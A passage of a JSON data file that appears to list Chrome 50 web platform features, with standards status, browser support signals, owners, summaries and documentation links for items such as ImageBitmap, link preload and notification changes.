    "name": "ImageBitmap",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/#imagebitmapfactories",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/42",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "xidachen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/249384",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "An ImageBitmap object represents a bitmap image that can be painted to a canvas without undue latency. An ImageBitmap object can be obtained from a variety of different objects, using the createImageBitmap() method. ImageBitmap provides an asynchronous and resource efficient pathway to prepare textures for rendering in WebGL.",
    "id": 5684964708319232,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/createimagebitmap-in-chrome-50",
        "https://developer.mozilla.org/en-US/docs/Web/API/ImageBitmap",
        "https://developer.mozilla.org/en-US/docs/Web/API/ImageBitmapFactories/createImageBitmap"
      ],
      "samples": [
        "https://ebidel.github.io/demos/images2video/index.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:34.435340",
      "by": "ericbidelman@google.com"
    },
    "name": "KeyboardEvent.prototype.keyLocation",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/uievents/#interface-KeyboardEvent",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/568261",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The keyLocation attribute allows disambiguating between keys that are on multiple places on a keyboard, like numbers and Enter. It is an alias of the location attribute, which is the more widely supported and standardized form. The keyLocation attribute will be removed.",
    "id": 4997403308457984,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-11-07 18:00:56.913540",
      "by": "ericbidelman@google.com"
    },
    "name": "Link rel=preload",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/preload/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1222633",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "ios": 50,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/471199",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/preload",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2015-November/027791.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Defines the \"preload\" keyword that may be used with `link` elements or Link header. This keyword provides a declarative fetch primitive that initiates an early fetch and separates fetching from resource execution.",
    "id": 5757468554559488,
    "resources": {
      "docs": [
        "https://www.smashingmagazine.com/2016/02/preload-what-is-it-good-for/",
        "https://developers.google.com/web/updates/2016/03/link-rel-preload"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:46.476870",
      "by": "ericbidelman@google.com"
    },
    "name": "Media Source Extensions - SourceBuffer.mode attribute and 'sequence' AppendMode support",
    "tags": [
      "AppendMode",
      "SourceBuffer",
      "mode",
      "segments",
      "sequence",
      "timestampOffset"
    ],
    "comments": "'sequence' AppendMode also allows a simpler migration path for current MSE players who may wish to switch from an MSE bytestream which uses 'generate timestamps flag' (audio/mpeg or audio/aac) to other bytestreams which require more app-directed control of where media appends occur in the timeline to obtain a similar result as 'sequence' enables.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/media-source/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/SourceBuffer/mode",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/586376",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/dn903679(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://w3c.github.io/test-results/media-source/all.html#test-file-40",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add 'mode' attribute to SourceBuffer, and support the ability to use and switch among 'sequence' and 'segments' appendMode.\r\n'segments' is the default (and current) behavior. 'sequence' enables web developers to simplify some types of media streaming apps that use Media Source Extensions (MSE).\r\n'sequence' appendMode allows more flexibility to maintain a gap-free buffered media timeline for web apps.",
    "id": 5645695201574912,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/mse-sourcebuffer",
        "https://developer.mozilla.org/en-US/docs/Web/API/SourceBuffer/mode",
        "https://msdn.microsoft.com/en-us/library/dn903679(v=vs.85).aspx"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:53.394260",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification action icons",
    "tags": [
      "notification",
      "action",
      "icon"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://notifications.spec.whatwg.org/#action-icon-url",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/notifications/issues/59",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "mvanouwerkerk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=585128",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "On some platforms the button rendered for a NotificationAction can display an icon. This change adds an optional icon url for notification actions.",
    "id": 5687043120168960,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/notifications"
      ],
      "samples": [
        "https://tests.peter.sh/notification-generator/#actions=3"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:07.571590",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification custom timestamps",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://notifications.spec.whatwg.org/#dom-notification-timestamp",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/notifications/issues/20",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=538720",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "By default, Web Notifications on Android display the time at which they were created in their top-right corner.\r\n\r\nHowever, this is not always appropriate. For example, when the device was offline the event could have happened in the past, or the notification could be shown for an upcoming meeting.\r\n\r\nThe `timestamp` property enables developers to provide the time.\r\n\r\nNote that we don't visually surface the timestamp on desktop right now, but do use it to affect notification ordering.",
    "id": 5899831990026240,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/notifications"
      ],
      "samples": [
        "https://tests.peter.sh/notification-generator/#timestamp=2"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:56.327670",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification notificationclose event",
    "tags": [
      "service worker",
      "notification",
      "close event"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://notifications.spec.whatwg.org/#closing-a-notification",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/notifications/pull/61",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "nsatragno@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/579150",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Fire a notificationclose event when a notification has been closed by the user in the registered Service Worker.",
    "id": 5706570994286592,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/notifications"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:16.425840",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification renotify preference flag",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://notifications.spec.whatwg.org/#renotify-preference-flag",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://notifications.spec.whatwg.org/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "harkness@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/442133",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows a developer to specify whether a notification should play sound, light, and vibrate alerts again when the notification replaces another notification which is currently displayed.",
    "id": 6618702728396800,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/notifications"
      ],
      "samples": [
        "https://tests.peter.sh/notification-generator/#tag=1;;renotify=true"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:10.901510",
      "by": "ericbidelman@google.com"
    },
    "name": "Object.observe()",
    "comments": "Originally shipped in Chrome 36, deprecated in 49, aiming to remove in 50.\r\n\r\nSee https://esdiscuss.org/topic/an-update-on-object-observe for notice of removal from ECMAScript standards track.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://wiki.ecmascript.org/doku.php?id=harmony:observe",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "rafaelw@chromium.org",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/162553",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Observe changes to JS objects.",
    "id": 6147094632988672,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/observe",
        "http://www.html5rocks.com/en/tutorials/es7/observe/"
      ],
      "samples": [
        "http://simpl.info/observe"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:49.004620",
      "by": "ericbidelman@google.com"
    },
    "name": "Presentation API: implement PresentationConnection.on{connect,close,terminate} and deprecate onstatechange",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/presentation-api/#event-handlers-1",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "avayvod@chromium.org",
          "imcheng@chromium.org",
          "mfoltz@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/579360",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Deprecate `PresentationConnection.onstatechange` and implement explicit state transition events `onconnect`, `onclose`, `onterminate`.\r\n\r\nImplement `PresentationConnectionCloseEvent` for `onclose`.\r\n\r\nThis allows us to expose a `PresentationConnectionCloseReason` for clients listening for `onclose`.",
    "id": 5662456714100736,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:02.567280",
      "by": "ericbidelman@google.com"
    },
    "name": "Push API: Payloads",
    "tags": [
      "push",
      "service workers",
      "sw"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/push-api/#pushmessagedata-interface",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/push-api/pull/130",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/486040",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The ability to include payloads with messages send using the Push API. Message payloads must be encrypted.",
    "id": 5746279325892608,
    "resources": {
      "docs": [
        "https://w3c.github.io/push-api/#pushmessagedata-interface",
        "https://tools.ietf.org/html/draft-ietf-webpush-encryption"
      ],
      "samples": [
        "https://github.com/googlechrome/push-encryption-node"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:07.001100",
      "by": "ericbidelman@google.com"
    },
    "name": "RegExp @@match, @@search, @@replace, @@split (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-properties-of-the-regexp-prototype-object",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "hablich@chromium.org",
          "rossberg@chromium.org",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "webview": 50,
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/regexpbuiltinses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support well-known symbols to enhance the Regex capabilities",
    "id": 5850516236009472,
    "resources": {
      "docs": [
        "https://code.google.com/p/v8/issues/detail?id=4345",
        "https://code.google.com/p/v8/issues/detail?id=4343",
        "https://code.google.com/p/v8/issues/detail?id=4344",
        "https://code.google.com/p/v8/issues/detail?id=4305"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:44.521010",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove geolocation from Insecure Contexts",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec-secure-contexts/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "jww@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "bug": "https://crbug.com/561641",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Per https://w3c.github.io/webappsec-secure-contexts/, we are deprecating and then removing geolocation from insecure contexts. Geolocation is a powerful feature that allows access to the user's precise location, which is a powerful privilege escalation for HTTP content injection. This will remove that attack vector by only allowing it over HTTPS.",
    "id": 5636088701911040,
    "resources": {
      "docs": [
        "Part of the larger effort to remove powerful features on insecure origins:",
        "https://chromium.org/Home/chromium-security/deprecating-powerful-features-on-insecure-origins",
        "blink-dev discussion and API owner approval:",
        "https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/ylz0Zoph76A/C1VNAhJ8BQAJ"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:53.032810",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove insecure TLS version fallback",
    "tags": [
      "ssl",
      "tls",
      "fallback"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.mozilla.org/en-US/firefox/37.0/releasenotes/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "bug": "https://crbug.com/583787",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "TLS has a version negotiation mechanism to securely introduce new versions without breaking compatibility. Yet buggy servers implemented this wrong in the past, so browsers were forced to add (non-standard) insecure fallbacks to work around this. Unlike TLS's actual version negotiation, the fallback is insecure. Network attackers can downgrade to weaker versions, despite both client and server supporting newer, more secure versions. Note that this does *not* remove TLS 1.0 and TLS 1.1.",
    "id": 5685183936200704,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:59.576040",
      "by": "ericbidelman@google.com"
    },
    "name": "SVGElement.offset(Parent|Top|Left|Width|Height)",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 50
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "https://crbug.com/463116",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These attributes should only be supported on HTMLElement, but have been supported on all Elements in WebKit and Blink. getBoundingClientRect() can typically be used as a replacement.",
    "id": 5724912467574784,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGElement"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:50.988410",
      "by": "ericbidelman@google.com"
    },
    "name": "Sequential focus navigation starting point",
    "tags": [
      "focus"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#sequential-focus-navigation-starting-point",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/454172",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The feature 'sequential focus navigation starting point' defines where we start to search for focusable area for sequential focus navigation (TAB or Shift-TAB) when there is no focused area.\r\n",
    "id": 5671747802103808,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:53.984220",
      "by": "ericbidelman@google.com"
    },
    "name": "Symbol.hasInstance (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tc39.github.io/ecma262/#sec-symbol.hasinstance",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 50
        },
        "owners": [
          "mvstanton@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": true,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4447",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=151120",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Symbol.hasInstance enables customizing the behavior of the 'instanceof' operator.",
    "id": 5690218174742528,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:46.935570",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Animations JavaScript API [level 1 interop part 1]",
    "comments": "Builds on http://www.chromestatus.com/feature/4854343836631040",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/web-animations/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1245000",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 50
        },
        "owners": [
          "shans@chromium.org",
          "dstockwell@chromium.org",
          "suzyh@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 50,
        "blink_components": [
          "Blink"
        ],
        "desktop": 50,
        "flag": false,
        "android": 50,
        "bug": "http://crbug.com/257235",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webanimationsjavascriptapi",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2015-November/027771.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A unified model for supporting animation and synchronization on the Web platform. This feature covers bug and interop fixes to bring Chrome in line with the spec: Cancel events; Animation.id; pause() moves from idle to the paused state; deprecate dashed-names as keys in keyframes.",
    "id": 5650817352728576,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/web-animations-improvements"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:03.528490",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Biquad filters run at a-rate",
    "comments": "There are no API changes, but moving from k-rate to a-rate automation will produce audible differences, generally for the better.  There will very likely be a performance hit with this change, but only if the application is doing parameter automations for BiquadFilter nodes.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
